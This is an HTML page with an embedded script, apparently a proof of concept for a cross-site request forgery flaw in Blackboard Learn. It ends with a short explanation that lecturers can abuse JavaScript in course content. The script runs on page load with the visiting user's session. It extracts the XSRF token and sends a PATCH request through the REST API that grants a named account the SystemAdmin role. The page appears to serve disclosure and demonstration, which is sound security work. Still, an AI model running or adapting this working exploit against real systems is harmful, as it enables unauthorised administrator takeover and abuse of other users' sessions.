<script type="text/javascript" language="javascript">
"use strict";

fetch("https://" + window.location.host + "/ultra/courses", {credentials: "include"})
    .then(function(response) { return response.text();})
    .then(function(t) {return Promise.resolve(/xsrf: "(.+)"/.exec(t)[1]);})
    .then(function(xsrf) {
        console.log(xsrf);
        //Harmless example:
        //let body = {gender: "Female"};
        //Gives SystemAdministrator role:
        let body = {systemRoleIds: ["SystemAdmin"]};
        return fetch("https://" + window.location.host + "/learn/api/public/v1/users/externalId:xsrf_example_abuser", {
            method: "PATCH",
            body: JSON.stringify(body),
            credentials: "include",
            headers: {
                "Content-Type": "application/json; charset=utf-8",
                "X-Blackboard-XSRF": xsrf
            }
        })
    }).then(function(response) {
        console.info(response);
        if (response.ok) {
            document.getElementById("xsrf_msg").innerHTML = "Congratulations! You've just elevated the lecturer to SystemAdmin status.";
        }
    });

</script>
<p>XSRF stands for 'Cross-Site Request Forgery', which is when a hostile script makes a request based on the current user's credentials, without the current user instigating the action. Because Learn (by default) allows the inclusion of javascript in course contents, any lecturer can abuse this to gain System Administrator status via a REST call.</p>
<p id="xsrf_msg" style="color:red"></p>
